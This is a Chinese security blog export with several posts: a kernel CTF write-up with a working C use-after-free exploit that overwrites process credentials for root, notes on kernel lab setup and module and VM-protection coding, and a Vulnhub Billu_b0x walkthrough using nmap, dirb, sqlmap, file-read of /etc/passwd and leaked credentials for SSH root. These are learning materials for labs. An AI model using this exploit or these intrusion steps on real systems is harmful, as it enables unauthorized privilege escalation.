*offset)&#123; size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &lt;= v4 ) return result; v6 = v4; copy_from_user(); result = v6; return result;&#125; babyread 这个和babywrite差不多，将babydev_struct.device_buf 的内容拷贝到buffer中 1234567891011121314151617ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)&#123; size_t v4; // rdx ssize_t result; // rax ssize_t v6; // rbx _fentry__(filp, buffer, length, offset); if ( !babydev_struct.device_buf ) return -1LL; result = -2LL; if ( babydev_struct.device_buf_len &lt;= v4 ) return result; v6 = v4; copy_to_user(buffer); result = v6; return result;&#125; 漏洞点 这里存在一个伪条件竞争的UAF漏洞，如果同时打开两个设备，那么后面分配的设备会覆盖掉之前的设备，因为babydev_struct是全局变量。同理，如果释放掉第一个设备，那么第二个设备也是被释放过的。 利用思路 这里采用改写进程的cred结构体来达到提权的目的。 打开两次设备，通过ioctl改写设备大小为cred结构体的大小，然后释放掉设备 fork一个新进程，这个新进程的cred结构体所在的空间会和之前释放掉的设备的空间重合 通过另一个文件描述符写，将cred中的uid和gid改为0 对应版本的cred结构体，大小为0xa8 123456789101112131415161718192021222324252627282930313233343536373839struct cred &#123; atomic_t usage;#ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers; /* number of processes subscribed */ void *put_addr; unsigned magic;#define CRED_MAGIC 0x43736564#define CRED_MAGIC_DEAD 0x44656144#endif kuid_t uid; /* real UID of the task */ kgid_t gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125;; exp： 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main()&#123; int fd1 = open("/dev/babydev",2); int fd2 = open("/dev/babydev",2); ioctl(fd1,0x10001,0xa8); close(fd1); int pid = fork(); if(pid &lt; 0) &#123; puts("[*] fork error!"); exit(0); &#125; else if (pid == 0) &#123; int buf[20]=&#123;0&#125;; write(fd2,buf,28); system("/bin/sh"); puts("you are root now"); &#125; else &#123; wait(NULL); &#125; return 0;&#125; 静态编译exp，然后将得到的二进制文件放入解压的文件夹下，重新打包系统 1find . | cpio -o --format=newc &gt; rootfs.cpio 启动系统，运行exp,获取root权限]]></content>
      <categories>
        <category>Linux_Kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kernel_pwn入门之环境搭建]]></title>
    <url>%2F2019%2F01%2F31%2F2019-1-31-kernel_pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[跟着大佬的博客，开始学习搭建内核环境。开篇文章记录一下。 获取内核获取内核的方法有两种，一种是自己下载源码，然后编译，另一种是通过apt直接下载内核 编译内核 下载源码 通过官网下载 在 https://www.kernel.org/ 上下载，最初我下的是2.6.0版本，发下编译会遇到很多问题……然后就放弃了，下了一个4.1.1版本 https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.1.1.tar.gz ubuntu上可以通过wget来下载 1wget https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.1.1.tar.gz 通过apt来下载 根据内核版本搜索，例如 sudo apt search linux-headers-4. 但是我没有发现我下的4.1.1版本的….能下的最低版本都是4.10.0-1004，但是问题不大，随便挑了个4.10.1来下 下载源码 sudo apt install linux-headers-4.10.0-1004 最后下载的源码会在/usr/src目录下 安装需要的依赖 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 解压源码，进入源码目录 输入 1make menuconfig 然后就会见到这个界面，按照大佬的做法 123456进入kernel hacking勾选以下项目Kernel debuggingCompile-time checks and compiler options —&gt; Compile the kernel with debug info和Compile the kernel with frame pointersKGDB然后保存退出 生成bzImage 1make bzImage 经过漫长的等待，出现下图的信息，说明编译成功。然后bzImage在 /arch/x86/boot中，vmlinux在当前路径下 解释下几个名词 vmlinux是未压缩的内核 vmlinuz是vmlinux的压缩文件。 vmlinux 是ELF文件，即编译出来的最原始的文件。 vmlinuz应该是由ELF文件vmlinux经过OBJCOPY后，并经过压缩后的文件 zImage是vmlinuz经过gzip压缩后的文件，适用于小内核 bzImage是vmlinuz经过gzip压缩后的文件，适用于大内核 下载内核 根据版本号搜索 sudo apt search linux-image- 挑个喜欢的下载 sudo apt download linux-image-4.10.0-1004-gcp 这个下载下来的是一个deb文件，解压后镜像在data.tar.xz中 编译busybox用来生成简易的文件镜像 busybox简介 BusyBox是一个遵循GPL协议、以自由软件形式发行的应用程序。Busybox在单一的可执行文件中提供了精简的Unix工具集，可运行于多款POSIX环境的操作系统，例如Linux（包括Android[6]）、Hurd[7]、FreeBSD[8][9]等等。由于BusyBox可执行文件的文件大小比较小、并通常使用Linux内核，这使得它非常适合使用于嵌入式系统。作者将BusyBox称为“嵌入式Linux的瑞士军刀”。[10] —摘自维基百科 busybox是Linux上的一个应用程序 它整合了许多Linux上常用的工具和命令 IBM的一篇关于busybox的文章 文章地址，写的很详细。 编译busybox 从官网上下载源代码https://busybox.net/ 我下的是busybox-1.30.0 解压，进入根目录 执行命令 make menuconfig，然后会出现一个界面 这里在Settings中勾选Build static binary (no shared libs)，然后save就可以了 编译，执行make install 编译完后会多出一个_install文件夹，这是编译后的结果 进入_install，然后输入如下命令 1234mkdir procmkdir systouch initchmod +x init 在init写入下面的内容，用于内核初始化 123456789101112#!/bin/shecho "&#123;==DBG==&#125; INIT SCRIPT"mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp# insmod /xxx.ko # 加载模块mdev -s # We need this to find /dev/sda laterecho -e "&#123;==DBG==&#125; Boot took $(cut -d' ' -f1 /proc/uptime) seconds"setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root 打包成镜像 12#在busybox的_install目录下输入下面的命令find . | cpio -o --format=newc &gt; ./rootfs.img 启动系统这里用qemu来运行 qemu简介1QEMU（quick emulator）是一款由Fabrice Bellard等人编写的免费的可执行硬件虚拟化的（hardware virtualization）开源托管虚拟机（VMM）。其与Bochs，PearPC类似，但拥有高速（配合KVM），跨平台的特性。QEMU是一个托管的虚拟机镜像，它通过动态的二进制转换，模拟CPU，并且提供一组设备模型，使它能够运行多种未修改的客户机OS，可以通过与KVM（kernel-based virtual machine开源加速器）一起使用进而接近本地速度运行虚拟机（接近真实计算机的速度）。QEMU还可以为user-level的进程执行CPU仿真，进而允许了为一种架构编译的程序在另外一中架构上面运行（借由VMM的形式）。 ---摘自维基百科 qemu的官方文档链接地址 启动脚本 将生成的rootfs.img和编译的内核bzImage文件放在同一文件夹下，新建一个启动脚本boot.sh，这是我是直接拿大佬的脚本来用的，加了一点注释，参数的具体意义可以参照qemu的官方文档。 1234567891011121314#! /bin/shqemu-system-x86_64 \-m 128M \ #指定虚拟机的RAM大小-kernel ./bzImage \ #指定内核-initrd ./rootfs.img \ #用于提供 INITRD镜像-append "root=/dev/ram rw oops=panic panic=1 kalsr" \ #-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \ #配置用户模式的网络-monitor /dev/null \ #将监视器重定向到主机设备/dev/null-smp cores=2,threads=1 \ #用于声明所有可能用到的cpus, i.e. sockets * cores * threads = maxcpus.-cpu kvm64,+smep \ #设置CPU的安全选项#-S 启动gdb调试#-gdb tcp:1234 等待gdb调试 运行这个脚本，启动qemu,等一下就可以了 编译ko内核环境搭好了，来学习下怎么编译模块文件 源码12345678910111213141516171819#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int __init init_fun(void)&#123; printk("&lt;1&gt;Hello,World! from the kernel space…\n"); return 0;&#125;static void __exit exit_fun(void)&#123; printk("&lt;1&gt;Goodbye, World! leaving kernel space…\n");&#125;module_init(init_fun);module_exit(exit_fun);MODULE_LICENSE("GPL"); Makefile1234567891011121314obj-m := hello.oKERNELDR := /home/zs0zrc/linux-4.1.1PWD := $(shell pwd) modules: $(MAKE) -C $(KERNELDR) M=$(PWD) modules moduels_install: $(MAKE) -C $(KERNELDR) M=$(PWD) modules_install clean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions 然后编译，将编译后的得到的ko文件放入 _install目录下，并修改init文件。重新打包一下镜像 最后用qemu运行，可以发现多出了模块的输出 reference http://myhackerworld.top/2019/01/06/%E5%86%85%E6%A0%B8pwn-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/ https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/ https://ch4r1l3.github.io/2018/10/07/linux-kernel-pwn-%E5%88%9D%E6%8E%A2-1/ http://p4nda.top/2018/04/04/kernel-pwn-start/ https://www.ibm.com/developerworks/cn/linux/l-busybox/index.html https://www.ibm.com/developerworks/cn/linux/l-qemu/]]></content>
      <categories>
        <category>Linux_Kernel</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux内核模块编程学习笔记]]></title>
    <url>%2F2019%2F01%2F19%2F2019-1-19-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[最近想研究下linux内核，就开始学习内核模块编程，写篇博客，做下学习笔记。 内核模块编程模块的定义内核模块就是具有独立功能的程序，它能被单独编译，但是不能单独运行，它的运行必须被链接到内核作为内核的一部分在内核空间运行。 用户编程和内核模块编程的区别 基本组成模块通常由一组函数和数据结构组成，用来实现一种文件系统、一个驱动程序或其他内核上层的功能。 内核编程3个必须的头文件 123#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt; 必须的两个函数 1234567891011121314//模块加载函数 static int __init init_fun(void) //函数名随意，__init和__exit是init.h中定义的宏&#123;// 初始化代码&#125;//模块卸载函数static void __exit exit_fun(void)&#123;// 释放代码&#125;module_init(init_fun); //驱动程序初始化的入口点module_exit(exit_fun); //对于可加载模块，内核在此处调用module_cleanup()函数，而对于内置的模块，它什么都不做。 一个简单的例子 12345678910111213141516171819// 基于 Linux 2.6的内核#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;static int __init init_fun( void )&#123; printk(“&lt;1&gt;Hello,World! from the kernel space…\n”); return 0;&#125;static void __exit exit_fun( void )&#123; printk(“&lt;1&gt;Goodbye, World! leaving kernel space…\n”);&#125;module_init(init_fun);module_exit(exit_fun);MODULE_LICENSE(“GPL”); //许可权限声明，如果不申明，模块加载时会收到内核的警告 模块编译工具：make(GNU的工程化编译工具) 工作原理： make 工具通过一个称为 Makefile 的文件来完成并自动维护编译工作。Makefile 需要按照某种语法进行编写，其中说明了如何编译各个源文件并连接生成可执行文件，并定义了源文件之间的依赖关系。 Makefile规则格式 : [tab] 冒号前面部分叫target，后面的部分叫前置条件，第二行必须由一个tab键起首，后面跟命令。 阮一峰 博客 这两篇文章可以做个入门 一个例子： 123456789# Makefile2.6obj-m += hellomod.o # 产生hellomod 模块的目标文件CURRENT_PATH := $(shell pwd) #模块所在的当前路径LINUX_KERNEL := $(shell uname -r) #Linux内核源代码的当前版本LINUX_KERNEL_PATH := /usr/src/linux-headers-$(LINUX_KERNEL) #Linux内核源代码的绝对路径all: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules #编译模块了clean: make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean #清理 常用的模块编程命令 lsmod 获得系统中加载了的所有模块以及模块间的依赖关系 cat /proc/modules 查看加载模块的信息 tree -a 在/sys/module 对应模块的文件夹下使用，可以显示一些联系 modinfo &lt;模块名&gt; 显示模块的信息 insmod &lt;模块名.ko&gt; 将模块插入内核 rmmod &lt;模块名.ko&gt; 将模块从内核中移除 后续如果有新东西的话会继续补充 reference linux 内核之旅]]></content>
      <categories>
        <category>CODE</category>
      </categories>
      <tags>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[逆向学习之虚拟机保护]]></title>
    <url>%2F2019%2F01%2F13%2F2019-11-13-%E9%80%86%E5%90%91%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%9D%E6%8A%A4%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[考试周终于过去了，是时候又要开始学习了。所以就研究下逆向中的虚拟机保护技术，下面记录下学习的过程，以及一些收获。 基础概念逆向中的虚拟机保护是一种基于虚拟机的代码保护技术。它将基于x86汇编系统中的可执行代码转换为字节码指令系统的代码，来达到不被轻易逆向和篡改的目的。简单点说就是将程序的代码转换自定义的操作码(opcode)，然后在程序执行时再通过解释这些操作码，选择对应的函数执行，从而实现程序原有的功能。 vm_start：虚拟机的入口函数，对虚拟机环境进行初始化 vm_dispatcher:调度器，解释opcode，并选择对应的handle函数执行，当handle执行完后会跳回这里，形成一个循环。 opcode :程序可执行代码转换成的操作码 ####虚拟机执行的基本流程 实现一个小型的虚拟机这里我通过实现一个简化版的小型虚拟机来加深对虚拟机的认识，语言用的是C语言。 要想实现虚拟机的话需要完成两个目标： 定义一套opcode 实现opcode的解释器 opcode只是一个标识，可以随便定义，这里我定义了4条指令，每条指令分别对应着一个字节的字节码。而opcode的解释器是用来对opcode进行解释，从而选择对应的handle函数执行。 定义opcode1234567enum opcodes&#123; MOV = 0xf1, XOR = 0xf2, RET = 0xf4, READ = 0xf5,&#125;; 因为我只是为了理解，所以就只定义了几个常用指令。这里我用了枚举类型来定义opcode，比较方便。 实现解释器opcode定义完后，就可以开始实现解释opcode的解释器了。解释器我们需要实现一个虚拟环境以及各个opcode对应的handle函数。虚拟环境则是真实物理机的一个虚拟，是自己定义的字节码运行的环境。 一些关键的结构体vm_cpu12345678typedef struct vm_cpus&#123; int r1; 虚拟寄存器r1 int r2; 虚拟寄存器r2 int r3; 虚拟寄存器r3 unsigned char *eip; 指向正在解释的opcode的地址 vm_opcode op_list[OPCODE_N]; opcode列表，存放了所有的opcode及其对应的处理函数&#125;vm_cpu; vm_opcode123456typedef struct&#123; unsigned char opcode; void (*handle)(void *); &#125;vm_opcode; 其中 r1-r3是我定义的通用寄存器，用来传参或者是存放返回值，eip指向正在解释的opcode的地址，op_list则存放了所有opcode及其对应的handle函数。 实现了虚拟环境后就可以开始实现解释器了。解释器的功能就是对opcode解析，选择相应的handle函数，并且将相应的参数传递给handle函数。由handle函数来解释执行一条指令 关键函数vm_init12345678910111213141516171819void vm_init(vm_cpu *cpu) //初始化虚拟机环境&#123; cpu-&gt;r1 = 0; cpu-&gt;r2 = 0; cpu-&gt;r3 = 0; cpu-&gt;eip = (unsigned char *)vm_code; //将eip指向opcode的地址 cpu-&gt;op_list[0].opcode = 0xf1; cpu-&gt;op_list[0].handle = (void (*)(void *))mov; //将操作字节码与对应的handle函数关联在一起 cpu-&gt;op_list[1].opcode = 0xf2; cpu-&gt;op_list[1].handle = (void (*)(void *))xor; cpu-&gt;op_list[2].opcode = 0xf5; cpu-&gt;op_list[2].handle = (void (*)(void *))read_; vm_stack = malloc(0x512); memset(vm_stack,0,0x512);&#125; vm_start123456789101112void vm_start(vm_cpu *cpu)&#123; /* 进入虚拟机 eip指向要被解释的opcode地址 */ cpu-&gt;eip = (unsigned char*)opcodes; while((*cpu-&gt;eip)!= RET)//如果opcode不为RET，就调用vm_dispatcher来解释执行 &#123; vm_dispatcher(*cpu-&gt;eip); &#125;&#125; vm_dispatcher12345678910111213void vm_dispatcher(vm_cpu *cpu)&#123; int i; for(i=0 ; i &lt; OPCODE_N ; i++) &#123; if(*cpu-&gt;eip == cpu-&gt;op_list[i].opcode) &#123; cpu-&gt;op_list[i].handle(cpu); break; &#125; &#125; &#125; handles12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455void mov(vm_cpu *cpu); void xor(vm_cpu *cpu); //xor flagvoid read_(vm_cpu *cpu); //call read ,read the flagvoid xor(vm_cpu *cpu)&#123; int temp; temp = cpu-&gt;r1 ^ cpu-&gt;r2; temp ^= 0x12; cpu-&gt;r1 = temp; cpu-&gt;eip +=1; //xor指令占一个字节 &#125;void read_(vm_cpu *cpu)&#123; char *dest = vm_stack; read(0,dest,12); //用于往虚拟机的栈上读入数据 cpu-&gt;eip += 1; //read_指令占一个字节 &#125;void mov(vm_cpu *cpu)&#123; //mov指令的参数都隐藏在字节码中，指令表示后的一个字节是寄存器标识，第二到第五是要mov的数据在vm_stack上的偏移 //我这里只是实现了从vm_stack上取数据和存数据到vm_stack上 unsigned char *res = cpu-&gt;eip + 1; //寄存器标识 int *offset = (int *) (cpu-&gt;eip + 2); //数据在vm_stack上的偏移 char *dest = 0; dest = vm_stack; switch (*res) &#123; case 0xe1: cpu-&gt;r1 = *(dest + *offset); break; case 0xe2: cpu-&gt;r2 = *(dest + *offset); break; case 0xe3: cpu-&gt;r3 = *(dest + *offset); break; case 0xe4: &#123; int x = cpu-&gt;r1; *(dest + *offset) = x; break; &#125; &#125; cpu-&gt;eip += 6; //mov指令占六个字节，所以eip要向后移6位&#125; 要执行的伪代码解释器到这就实现完了。接下来是要将想要实现功能的伪代码转成自定义的opcode，伪代码的功能是从标准输入中读取12个字节的字符串，然后将读入的字符串每个字符与0x0还有0x12进行异或，并且将结果存储在虚拟机的栈上。写出来大致就是下面这样子 123456789101112131415161718192021222324252627282930313233343536373839404142/* call read_ MOV R1,flag[0] XOR MOV R1,0x20; //这是将R1的值送到vm_stack+0x20的位置，后面的同上 MOV R1,flag[1] XOR MOV R1,0x21; MOV R1,flag[2] XOR MOV R1,0x22 MOV R1,flag[3] XOR MOV R1,0x23; MOV R1,flag[4] XOR MOV R1,0x24; MOV R1,flag[5] XOR MOV R1,0x25; MOV R1,flag[6] XOR MOV R1,0x26; MOV R1,flag[7] XOR MOV R1,0x26 MOV R1,flag[7] XOR MOV R1,0X27 MOV R1,flag[7] XOR MOV R1,0x28 MOV R1,flag[7] XOR MOV R1,0X29 MOV R1,flag[7] XOR MOV R1,0x2A MOV R1,flag[7] XOR MOV R1,0x2b*/ 将它转换成对应的字节码，然后用解释器去解释执行就可以实现伪代码的功能。 1234567891011121314151617unsigned char vm_code[] = &#123; 0xf5, 0xf1,0xe1,0x0,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x20,0x00,0x00,0x00, 0xf1,0xe1,0x1,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x21,0x00,0x00,0x00, 0xf1,0xe1,0x2,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x22,0x00,0x00,0x00, 0xf1,0xe1,0x3,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x23,0x00,0x00,0x00, 0xf1,0xe1,0x4,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x24,0x00,0x00,0x00, 0xf1,0xe1,0x5,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x25,0x00,0x00,0x00, 0xf1,0xe1,0x6,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x26,0x00,0x00,0x00, 0xf1,0xe1,0x7,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x27,0x00,0x00,0x00, 0xf1,0xe1,0x8,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x28,0x00,0x00,0x00, 0xf1,0xe1,0x9,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x29,0x00,0x00,0x00, 0xf1,0xe1,0xa,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2a,0x00,0x00,0x00, 0xf1,0xe1,0xb,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2b,0x00,0x00,0x00, 0xf1,0xe1,0xc,0x00,0x00,0x00,0xf2,0xf1,0xe4,0x2c,0x00,0x00,0x00, 0xf4&#125;; 至此，简化版的小型虚拟机就实现完了。我在虚拟机中实现了对输入字符串简单的异或加密，并将加密后的值存储到指定位置。我觉得这个过程是十分有意义的，让我加深了对虚拟机保护的了解。因为能力有限，所以就只实现了一个很简单的小型虚拟机。虚拟机相关的题目还没有做，等有时间再去做一下。]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Vmare protect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vulnhub-Billu_b0x 靶机的渗透测试学习记录]]></title>
    <url>%2F2018%2F11%2F26%2F2018-11-26-Vulnhub-Billu_b0x-%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[靶机Vulnhub–Billu_b0x 下载链接 目标Boot to root：通过各种方式获取虚拟机的root权限。 我的攻击机是kali。靶机直接用VMware打开就行了，设置网络模式为NAT。这个靶机打开后是要登陆的，因为不知道用户名和密码，所以没法登陆，开机就好了。 ​ 工具 nmap 发现目标ip，并进行端口扫描及服务识别 dirb 爆破目录 dirbuster 爆破目录 sqlmap 用来进行sql注入 蚁剑 文档 管理webshell kali虚拟机 收集信息 发现ip nmap -sP 192.168.133.1/24 -sP参数代表着ping扫描， 扫描kali所属的C网段 扫出的ip为192.168.133.150 端口扫描 nmap -p1-65535 -A 192.168.133.150 扫描目标机开的端口，及服务 发现开启了22端口和80端口 1222/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.2.22 ((Ubuntu)) 访问80端口的web服务，只有一个登陆界面，并且提示 show me you sqli skills。说明这个页面存在sql注入，但是先不管它。 爆破目录 利用kali自带的dirb工具 dirb http://192.168.133.150:80 爆出来的路径, 得到页面较多，test.php、add.php、in.php、c.php、index.php、show.php等，目录有：uploaded_images，phpmy等 1234567891011121314151617181920212223242526272829303132333435root@zs0zrc:~# dirb http://192.168.133.150:80-----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Mon Nov 26 18:48:26 2018URL_BASE: http://192.168.133.150:80/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.133.150:80/ ----+ http://192.168.133.150:80/add (CODE:200|SIZE:307) + http://192.168.133.150:80/c (CODE:200|SIZE:1) + http://192.168.133.150:80/cgi-bin/ (CODE:403|SIZE:291) + http://192.168.133.150:80/head (CODE:200|SIZE:2793) ==&gt; DIRECTORY: http://192.168.133.150:80/images/ + http://192.168.133.150:80/in (CODE:200|SIZE:47559) + http://192.168.133.150:80/index (CODE:200|SIZE:3267) + http://192.168.133.150:80/index.php (CODE:200|SIZE:3267) + http://192.168.133.150:80/panel (CODE:302|SIZE:2469) + http://192.168.133.150:80/server-status (CODE:403|SIZE:296) + http://192.168.133.150:80/show (CODE:200|SIZE:1) + http://192.168.133.150:80/test (CODE:200|SIZE:72) ---- Entering directory: http://192.168.133.150:80/images/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode &apos;-w&apos; if you want to scan it anyway) -----------------END_TIME: Mon Nov 26 18:48:30 2018DOWNLOADED: 4612 - FOUND: 11 用dirbuster工具 漏洞挖掘 漏洞挖掘从下面几个方面入手 首页的SQL注入，毕竟它提示了 查看爆破目录的结果，看是否有什么其它有用的信息 用工具扫 如果可以得到网站的源码，也可以用工具去扫描漏洞 先SQL注入一波，话不多说，sqlmap开跑 sqlmap -u “http://192.168.133.150&quot; –data “un=admin&amp;ps=admin&amp;login=let%27s+login” –level 3 –dbms mysql 这个因为我试不出它过滤了什么，所以直接用salmap跑，跑了好久都跑不出来。打扰了 SQL注入，暂时failed 查看爆破出来的网页路径有没什么有用的信息 如下 1234567+ http://192.168.133.150:80/in (CODE:200|SIZE:47559) + http://192.168.133.150:80/index (CODE:200|SIZE:3267) + http://192.168.133.150:80/index.php (CODE:200|SIZE:3267) + http://192.168.133.150:80/panel (CODE:302|SIZE:2469) + http://192.168.133.150:80/server-status (CODE:403|SIZE:296) + http://192.168.133.150:80/show (CODE:200|SIZE:1) + http://192.168.133.150:80/test (CODE:200|SIZE:72) 分别访问下，感觉可能有用的几个 http://192.168.133.150:80/in 这个会将php的配置信息打印出来，会暴露一些敏感信息 http://192.168.133.150:80/server-status 不允许访问 http://192.168.133.150:80/test 这个要求”file”参数不为空，我试了下，发现是POST请求的参数。利用谷歌浏览器的插件POSTman，发送post请求，参数为 file = “test.php”。发现它直接将源代码返回给我了，利用这个可以读取所有网页的代码 发送POST请求 利用test读取文件的功能，读取/etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/falsemessagebus:x:103:106::/var/run/dbus:/bin/falsewhoopsie:x:104:107::/nonexistent:/bin/falselandscape:x:105:110::/var/lib/landscape:/bin/falsesshd:x:106:65534::/var/run/sshd:/usr/sbin/nologinica:x:1000:1000:ica,,,:/home/ica:/bin/bash 可以发现拥有root权限的两个账号分别为 root和 ica 利用test 将网站的源代码搞到手，然后开始源码审计 发现在c.php中有数据库的用户名及密码 用户名为 billu ,密码为b0x_billu，所以利用这用户密码登陆数据库 登进去了，然后我就不知道做什么了…..打扰了。尝试用mysql的密码登陆ssh，发现失败了。接着试了下用数据库中的用户名和密码登陆ssh，还是失败了。打扰了，orz 想了下，phpmyadmin的默认配置文件好像会有服务器的密码。于是就将它读取了出来 猜的路径为 /phpmy/config.inc.php 哇哦 ，看得到了什么， 服务器用户 root，密码 为roottoor 再次尝试登陆ssh，一下就登进去了。root权限，相干啥就干啥咯。其实到这里实验就算结束了。但是还有SQL注入没玩，所以我就又去玩了玩。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 index.php 源码：```php&lt;?php session_start(); include('c.php'); include('head.php'); if(@$_SESSION['logged']!=true) &#123; $_SESSION['logged']=''; &#125; if($_SESSION['logged']==true &amp;&amp; $_SESSION['admin']!='') &#123; echo "you are logged in :)"; header('Location: panel.php', true, 302); &#125; else &#123; echo ' &lt;div align=center style="margin:30px 0px 0px 0px;"&gt; &lt;font size=8 face="comic sans ms"&gt;--==[[ billu b0x ]]==--&lt;/font&gt; &lt;br&gt; &lt;br&gt; Show me your SQLI skills &lt;br&gt; &lt;form =post&gt; Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt; &lt;br&gt; &lt;input type=submit name=login value="let\'s login"&gt;'; &#125; if(isset($_POST['login'])) &#123; $uname=str_replace('\'','',urldecode($_POST['un'])); $pass=str_replace('\'','',urldecode($_POST['ps'])); $run='select * from auth where pass=\''.$pass.'\' and uname=\''.$uname.'\''; $result = mysqli_query($conn, $run); if (mysqli_num_rows($result) &gt; 0) &#123; $row = mysqli_fetch_assoc($result); echo "You are allowed &lt;br&gt;"; $_SESSION['logged']=true; $_SESSION['admin']=$row['username']; header('Location: panel.php', true, 302); &#125; else &#123; echo " &lt;script&gt;alert('Try again');&lt;/script&gt;"; &#125; &#125; echo " &lt;font size=5 face=\"comic sans ms\" style=\"left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\"&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; "; ?&gt;``` 可以发现它的过滤语句 和SQL查询语句。 